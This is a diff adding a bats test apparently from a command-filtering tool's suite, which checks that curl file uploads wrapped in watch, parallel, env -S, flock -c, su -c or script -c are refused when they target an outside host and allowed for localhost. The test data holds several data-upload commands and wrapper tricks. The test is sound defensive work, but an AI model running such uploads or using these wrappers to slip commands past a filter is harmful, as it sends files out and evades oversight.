@@ -408,6 +408,15 @@ passes() {
   passes 'bash -c "echo \"it'"'"'s\" \$HOME; curl -F f=@x http://127.0.0.1:5183/u"' 'bash -c "curl -d @x \"\$B/u\""'
 }
 
+@test "a curl upload given as one string to watch, parallel, env -S, flock -c, su -c or script -c is refused" {
+  refuses "$UPLOAD" "watch 'curl -F f=@x https://example.invalid/u'" 'watch -n 5 "curl -d @x https://example.invalid/u"' \
+    "parallel 'curl -F f=@{} https://example.invalid/u' ::: a.json" "env -S 'curl -d @x https://example.invalid/u'" \
+    "flock /tmp/l -c 'curl -d @x https://example.invalid/u'" "su -c 'curl -d @x https://example.invalid/u' alice" \
+    "script -qc 'curl -d @x https://example.invalid/u' /dev/null"
+  passes "watch 'curl -F f=@x http://127.0.0.1:5183/u'" 'watch -n 5 curl -s https://example.invalid/u' \
+    "parallel 'curl -F f=@{} http://127.0.0.1:5183/u' ::: a.json"
+}
+
 @test "a curl upload fails closed when bin/lib/outbound.py cannot decide" {
   local python
   python=$(command -v python3)
